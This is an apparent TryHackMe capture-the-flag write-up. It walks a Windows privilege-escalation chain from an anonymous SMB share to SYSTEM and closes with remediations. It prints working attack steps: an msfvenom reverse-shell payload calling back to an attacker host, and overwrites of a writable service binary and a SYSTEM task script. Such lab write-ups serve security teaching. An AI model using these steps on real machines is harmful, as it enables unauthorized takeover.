# Windows PrivEsc Chain — [TryHackMe](https://tryhackme.com/)

**Date:** 2026-08-17  
**Difficulty:** Medium  
**Category:** Windows Privilege Escalation — lateral movement to SYSTEM  
**Skills used:** SMB enumeration, RDP, service binary hijacking, registry credential disclosure, scheduled-task abuse, msfvenom, winPEAS/PowerUp  

> ⚖️ Performed in an authorized, in-scope lab environment (TryHackMe). All flags, passwords, and IP addresses recovered during this exercise have been redacted from this writeup.

---

## Overview

The target was a neglected standalone Windows 10 / Server 2019 workstation (hostname `PRIVESC`) left behind after staff changes and never decommissioned. The objective was to escalate from anonymous guest access to full SYSTEM control by abusing a series of misconfigurations:

```
guest → thmuser → notadmin → svcadmin → SYSTEM
```

Each hop used a different, classic Windows privilege-escalation technique: credentials left in a guest-readable share, a service binary with weak permissions, a plaintext AutoLogon credential in the registry, and finally a SYSTEM scheduled task running a writable script. The recurring root cause was that privileged components trusted files or values that lower-privileged users could read or modify.

---

## Reconnaissance

An `nmap` scan (with `-Pn`, since the host blocks ICMP) showed a Windows box exposing:

| Port | Service | Notes |
|------|---------|-------|
| 135 | msrpc | Windows RPC |
| 139/445 | SMB | File sharing — enumeration surface and foothold |
| 3389 | RDP | Interactive access once credentials are obtained |

Notably **no WinRM (5985)**, so interactive access would be via RDP. The RDP NTLM info identified the machine as a standalone workstation named `PRIVESC`.

---

## Hop 1 — guest → thmuser

**Mechanism: credentials in a guest-readable SMB share.**

An anonymous (null-session) SMB connection listed the available shares, including a non-default `Public` share readable without credentials:

```
smbclient -L //<target>/ -N
smbclient //<target>/Public -N
```

The share contained a `welcome.txt` "new employee onboarding" note left by IT, disclosing default credentials for `thmuser` in plaintext. These credentials granted an interactive RDP session as `thmuser`, and the first flag was on that user's Desktop.

> Flag 1: `THM{...redacted...}`

*Root cause:* sensitive credentials stored in a world-readable file on an anonymously accessible share.

---

## Hop 2 — thmuser → svcadmin

**Mechanism: weak permissions on a service binary.**

Enumeration of non-default services (`wmic service get name,pathname,startname`) revealed a custom service whose binary sat outside `C:\Windows` system paths and ran as a named service account:

```
THM Background Service (THMSvc)   C:\Windows\THMSVC\svc.exe   .\svcadmin
```

Checking the binary's permissions showed the critical flaw:

```
icacls C:\Windows\THMSVC\svc.exe
  → Everyone:(F)
```

**Everyone had Full control of the service executable.** The folder itself could not be listed or have new files created in it, but the *existing* `svc.exe` file could be overwritten directly (file ACL vs. folder ACL are independent).

A service-compatible reverse shell was generated and used to replace the binary:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker> LPORT=<port> -f exe-service -o svc.exe
```

The payload was written over `svc.exe`, a listener was started, and the service (a `DEMAND_START` service) was started manually:

```
sc.exe start THMSvc
```

The service executed the replaced binary as `svcadmin`, returning a shell as that account. (`sc.exe start` reports a timeout because the payload is not a true service, but the shell connects before that.)

> Flag 3: `THM{...redacted...}`

*Root cause:* a service binary writable by unprivileged users runs under a more privileged account.

---

## Hop 3 — recovering notadmin (registry AutoLogon)

**Mechanism: plaintext credential in the Winlogon registry.**

Querying the Winlogon registry key disclosed an AutoLogon configuration storing a password in cleartext:

```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
  AutoAdminLogon   : 1
  DefaultUserName  : notadmin
  DefaultPassword  : <redacted>
```

These credentials allowed authenticating as `notadmin` (via `runas` / a credentialed process launch, since `notadmin` lacked RDP rights), and reading the flag on that user's Desktop that no other account could access.

> Flag 2: `THM{...redacted...}`

*Root cause:* AutoLogon stores the password in plaintext in a registry key readable by low-privileged users.

*Note:* `notadmin` and `svcadmin` turned out to be parallel unprivileged accounts (neither a local admin, neither holding `SeImpersonatePrivilege`), so the path to SYSTEM did not run through either account's privileges — it came from a separate machine misconfiguration.

---

## Hop 4 — svcadmin → SYSTEM

**Mechanism: writable script executed by a SYSTEM scheduled task.**

With no impersonation privileges and `AlwaysInstallElevated` unset, enumeration focused on scheduled tasks and writable files run by privileged processes. A batch script was found under the scheduled-tasks directory that was writable by the current user and executed by a task running as SYSTEM:

```
C:\Windows\Tasks\cleanup.bat   (writable)
```

The script was overwritten to launch a reverse-shell executable that had been staged on disk:

```
echo C:\Windows\Tasks\shell.exe > C:\Windows\Tasks\cleanup.bat
```

When the scheduled task next executed `cleanup.bat` as SYSTEM, it launched the staged payload, returning a shell as `NT AUTHORITY\SYSTEM` — completing the chain. As SYSTEM, all remaining flags (including any restricted to other users) were readable.

> Flag (SYSTEM): `THM{...redacted...}`

*Root cause:* a script executed by a SYSTEM scheduled task is writable by an unprivileged user.

---

## The Chain

```
guest ──(creds in guest-readable SMB share)──► thmuser
      ──(Everyone:F on service binary → overwrite + start)──► svcadmin
      ──(AutoLogon plaintext password in registry)──► notadmin
      ──(writable script run by a SYSTEM scheduled task)──► SYSTEM
```

Every hop shares one root cause: **a privileged component trusts something a lower-privileged user can read or modify** — a readable share, a writable service binary, a readable registry credential, a writable task script. No single misconfiguration was catastrophic alone; chained, they walked anonymous access to SYSTEM.

---

## The Fix (Defensive View)

**1. Credentials in a readable share (High).**
Root cause: plaintext credentials in `welcome.txt` on an anonymously readable share.
*Remediation:* never store credentials in files; disable anonymous/guest SMB access; require password change and use per-user onboarding that doesn't expose secrets.

**2. Weak service binary permissions (Critical).**
Root cause: `Everyone:(F)` on a service executable that runs as a privileged account.
*Remediation:* restrict service binary and directory ACLs to administrators/SYSTEM only; audit with `accesschk` for services writable by non-admins.

**3. AutoLogon plaintext credential (High).**
Root cause: `DefaultPassword` stored in cleartext in the Winlogon registry key.
*Remediation:* avoid AutoLogon; if required, use the LSA secrets–based mechanism (`AutoLogonSID`/secure storage) rather than a plaintext `DefaultPassword`, and rotate the exposed credential.

**4. Writable SYSTEM task script (Critical).**
Root cause: a script run by a SYSTEM scheduled task is writable by unprivileged users.
*Remediation:* restrict write permissions on all scripts/binaries executed by privileged tasks to administrators/SYSTEM; audit scheduled-task actions and their file ACLs.

---

## What I Learned

- **Windows privesc is a different toolkit but the same logic as Linux.** Instead of `sudo`/cron/SUID, the vectors are services, scheduled tasks, registry credentials, and stored secrets — but the core question is identical: *what does a privileged process trust that I can control?*
- **File ACLs and folder ACLs are independent.** The service binary could be overwritten even though the folder couldn't be listed or written — a distinction that decided the hop-2 exploit.
- **Enumerate configs, not just accounts.** The SYSTEM vector was not a user privilege (all three intermediate accounts were unprivileged) — it was a machine misconfiguration (a writable task script) that only appears when you query for it. Confirming *who* you are is not the same as finding *what* is misconfigured.
- **Stage tools before starting.** On a timed lab, having winPEAS, PowerUp, accesschk, and a fresh payload ready on the attacker box saves re-doing the whole chain after a redeploy.
- **`whoami /priv` decides the SYSTEM strategy.** When `SeImpersonatePrivilege` is present, a potato attack is the fast path; when it's absent (as here), the escalation must come from a service, task, or credential instead.
